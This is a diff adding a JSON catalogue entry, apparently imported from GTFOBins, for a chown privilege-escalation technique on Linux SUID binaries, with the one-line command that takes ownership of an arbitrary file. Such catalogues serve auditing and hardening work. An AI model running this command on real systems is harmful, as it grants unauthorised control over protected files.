@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-chown-privilege-escalation",
+  "name": "GTFOBins · chown (privilege-escalation)",
+  "command": "chown $(id -un):$(id -gn) /path/to/input-file",
+  "description": "Use chown to privilege escalation via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "chown",
+    "privilege-escalation"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/chown/#privilege-escalation",
+  "upstream_id": "chown/privilege-escalation/0",
+  "category": "gtfobins",
+  "subcategory": "suid",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/chown/"
+    }
+  ]
+}
